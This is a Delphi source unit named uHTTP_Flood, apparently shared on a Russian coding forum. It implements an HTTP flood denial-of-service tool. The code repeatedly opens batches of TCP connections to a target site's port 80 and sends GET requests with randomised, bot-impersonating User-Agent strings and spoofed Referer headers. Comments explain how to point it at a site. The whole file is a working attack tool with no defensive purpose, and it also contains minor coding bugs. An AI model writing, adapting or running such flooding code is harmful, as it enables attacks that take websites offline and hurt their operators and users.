//*******************************************//
//       Coded by NIV aka coder              //
//           Made in Belarus                 //
// Welcome http://forum.codingworld.ru       //
//*******************************************//

unit uHTTP_Flood;

interface

uses
Windows, WinSock;
const
UserAgent :array[0..9] of string = (
 'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12',
 'Mozilla/5.0 (iPhone;  U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16',
 'Mozilla/5.0 (compatible; Googlebot/2.1',
 'Mozilla/5.0 (compatible; msnbot/1.1',
 'Mozilla/5.0 (compatible; Yahoo! Slurp',
 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)',
 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) Opera/9.60 Presto/2.1.1',
 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.A.B.C Safari/525.13'
 );


Referer :array[0..9] of string = (
 'www.yandex.ru',
 'www.aport.ru',
 'www.rambler.ru',
 'www.google.ru',
 'www.yahoo.com',
 'www.altavista.com',
 'www.ya.ru',
 'www.meta.ua',
 'www.all.by',
 'www.lycos.com'
 );
  var
  ThreadHttp   :Cardinal;
  idThreadHttp :Cardinal;
  HHttp        :Boolean;


procedure MakeFloodHttp(szHost,szURL :String);

implementation


 var
  Host      :String;
  url       :String;
  Speed     :Integer;


function CreateHTTPRequest: String;
var
 zapros: String;
//  b :TextFile;
begin
begin
Randomize;
zapros:='GET '+URL+' HTTP/1.1'#13#10+
        'Host: '+host+ #13#10+
        'User-Agent: '+ UserAgent[Random(9)]+ #13#10+
        'Accept: */*;q=0.1'#13#10+
        'Accept-Encoding: gzip,deflate'#13#10+
        'Accept-Language: ru-RU,ru;q=0.9,en;q=0.8'#13#10+
        'Referer: '+ Referer[Random(9)] + #13#10 +
        'Content-Type: application/x-www-form-urlencoded'#13#10+
        'Connection: Keep-Alive'#13#10#13#10;
 {   begin
    assignfile(b, 'LOG_STRING.txt');
    append(b);
    writeln(b, zapros);
    closefile(b);
   end; }
end;
  Result := zapros;
end;



procedure fWSRecv;
var
hSocket:array [0..400] of TSocket;
hHost: PHostEnt;
hAddr: TSockAddrIn;
zapros,site:string;
c,Speed :integer;

begin
 site:=host;
 zapros:= CreateHTTPRequest;
 hHost := gethostbyname(PChar(site));
 hAddr.sin_family := AF_INET;
 hAddr.sin_port := htons(80);
 hAddr.sin_addr := pinaddr(hHost^.h_addr^)^;
   while HHTTP = True do
 begin
   for c := 0 to Speed do
  begin
     hSocket[c] := socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  end;
      for c := 0 to Speed do //25 количество потоков
  if connect(hSocket[c], hAddr, SizeOf(hAddr)) = SOCKET_ERROR then
     begin
       closesocket(hSocket[c]);
         exit;
          end;
        for c := 0 to Speed do
        
 if    Send(hSocket[c], zapros[1], length(zapros), 0) = SOCKET_ERROR then
    exit;
  for c := 0 to Speed do
 CloseSocket(hSocket[c]);
 // чтобы убить основной поток использовать -->  SuspendThread(ThreadHTTP);
 end;
 SuspendThread(ThreadHTTP);
  exit;
 end;
//Вызываем Make('www.site.com','');
//2 параметр может быть пустой или например /search.php?searchid=4219

procedure MakeFloodHttp(szHost,szURL :String );
var
ws:TwsaData;
begin
  WSAStartup($101, ws);
  Host := szHost;
  URL := szURL;
  Speed := 125;
  HHTTP := True;
  ThreadHTTP := CreateThread(nil, 0, @fWSRecv, nil, 0, idThreadHTTP);
end;

end.

